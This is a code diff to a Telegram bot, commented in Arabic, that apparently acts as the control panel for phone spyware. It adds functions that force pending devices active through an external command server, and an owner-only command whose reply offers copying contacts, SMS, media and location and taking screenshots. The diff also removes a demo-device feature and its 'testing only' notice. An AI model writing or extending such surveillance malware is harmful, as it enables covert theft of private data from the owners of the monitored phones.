@@ -538,6 +538,49 @@ def get_available_device(user_id):
     
     return None, "لا توجد أجهزة متاحة"
 
+def check_device_connection(device_id):
+    """التحقق من اتصال الجهاز الفعلي"""
+    try:
+        # محاولة الاتصال بالجهاز عبر خادم الأوامر
+        command_server_url = os.environ.get('COMMAND_SERVER_URL', 'https://remote-control-command-server.onrender.com')
+        
+        response = requests.get(f"{command_server_url}/device/{device_id}/status", timeout=5)
+        
+        if response.status_code == 200:
+            status_data = response.json()
+            return status_data.get('connected', False)
+        
+        return False
+    except Exception as e:
+        logger.error(f"خطأ في التحقق من اتصال الجهاز {device_id}: {e}")
+        return False
+
+def force_device_activation(device_id):
+    """إجبار تفعيل الجهاز"""
+    try:
+        # تحديث حالة الجهاز إلى نشط
+        device_manager.update_device_status(device_id, 'active', 'Force activated')
+        
+        # إرسال إشارة تفعيل للجهاز
+        command_server_url = os.environ.get('COMMAND_SERVER_URL', 'https://remote-control-command-server.onrender.com')
+        
+        activation_data = {
+            'device_id': device_id,
+            'action': 'activate',
+            'timestamp': int(time.time())
+        }
+        
+        response = requests.post(f"{command_server_url}/device/activate", json=activation_data, timeout=10)
+        
+        if response.status_code == 200:
+            logger.info(f"تم إجبار تفعيل الجهاز: {device_id}")
+            return True
+        
+        return False
+    except Exception as e:
+        logger.error(f"خطأ في إجبار تفعيل الجهاز {device_id}: {e}")
+        return False
+
 def import_devices_from_web_interface(user_id):
     """استيراد الأجهزة من واجهة الويب"""
     try:
@@ -561,31 +604,10 @@ def import_devices_from_web_interface(user_id):
                 logger.info(f"تم استيراد {imported_count} جهاز من واجهة الويب")
                 return imported_count > 0
         
-        # إذا فشل الاستيراد، إنشاء جهاز افتراضي للتجربة
-        return create_demo_device(user_id)
+        return False
         
     except Exception as e:
         logger.error(f"خطأ في استيراد الأجهزة من واجهة الويب: {e}")
-        # إنشاء جهاز افتراضي للتجربة
-        return create_demo_device(user_id)
-
-def create_demo_device(user_id):
-    """إنشاء جهاز افتراضي للتجربة"""
-    try:
-        # إنشاء معرف جهاز افتراضي
-        demo_device_id = f"DEMO-{user_id}-{int(time.time())}"
-        
-        # إضافة الجهاز الافتراضي
-        if device_manager.add_device_auto(user_id, demo_device_id):
-            # تفعيل الجهاز فوراً
-            device_manager.update_device_status(demo_device_id, 'active', 'Demo device for testing')
-            
-            logger.info(f"تم إنشاء جهاز افتراضي: {demo_device_id}")
-            return True
-        
-        return False
-    except Exception as e:
-        logger.error(f"خطأ في إنشاء الجهاز الافتراضي: {e}")
         return False
 
 # تهيئة المدراء
@@ -828,9 +850,10 @@ def link_device(message):
     else:
         bot.reply_to(message, "❌ حدث خطأ أثناء إنشاء الرابط. يرجى المحاولة مرة أخرى.")
 
-@bot.message_handler(commands=['demo'])
-def create_demo_device_command(message):
-    """إنشاء جهاز تجريبي للاختبار"""
+
+@bot.message_handler(commands=['force_activate'])
+def force_activate_devices(message):
+    """إجبار تفعيل جميع الأجهزة المعلقة"""
     user_id = message.from_user.id
     
     if not is_owner(user_id):
@@ -845,30 +868,44 @@ def create_demo_device_command(message):
         bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
         return
 
-    # إنشاء جهاز تجريبي
-    if create_demo_device(user_id):
-        demo_text = """
-🧪 **تم إنشاء جهاز تجريبي بنجاح!**
+    # الحصول على جميع الأجهزة
+    devices = device_manager.get_user_devices(user_id)
+    
+    if not devices:
+        bot.reply_to(message, "📱 لا توجد أجهزة مرتبطة.\nاستخدم `/link` لربط جهاز جديد.")
+        return
 
-✅ **الجهاز جاهز للاستخدام:**
-• معرف الجهاز: `DEMO-{user_id}-{timestamp}`
-• الحالة: نشط ومتصل
-• جاهز لاستقبال الأوامر
+    activated_count = 0
+    failed_count = 0
+    
+    for device_id, status, last_seen, device_info in devices:
+        if status == 'pending':
+            # محاولة إجبار تفعيل الجهاز
+            if force_device_activation(device_id):
+                activated_count += 1
+            else:
+                failed_count += 1
+    
+    if activated_count > 0:
+        result_text = f"""
+🔧 **تم إجبار تفعيل الأجهزة:**
 
-🔧 **يمكنك الآن استخدام الأوامر:**
+✅ **تم تفعيل:** {activated_count} جهاز
+❌ **فشل في التفعيل:** {failed_count} جهاز
+
+📱 **يمكنك الآن استخدام الأوامر:**
 • `/contacts` - نسخ جهات الاتصال
 • `/sms` - نسخ الرسائل النصية
 • `/media` - نسخ الوسائط
 • `/location` - الحصول على الموقع
 • `/screenshot` - التقاط لقطة شاشة
-
-⚠️ **ملاحظة:** هذا جهاز تجريبي للاختبار فقط
         """
-        
-        bot.reply_to(message, demo_text, parse_mode='Markdown')
-        device_manager.log_activity(user_id, 'create_demo_device')
+        bot.reply_to(message, result_text, parse_mode='Markdown')
     else:
-        bot.reply_to(message, "❌ فشل في إنشاء الجهاز التجريبي. يرجى المحاولة مرة أخرى.")
+        bot.reply_to(message, f"❌ فشل في تفعيل أي جهاز.\nفشل: {failed_count} جهاز")
+    
+    device_manager.log_activity(user_id, 'force_activate_devices', f'activated: {activated_count}, failed: {failed_count}')
+
 
 @bot.message_handler(commands=['devices'])
 def list_devices(message):
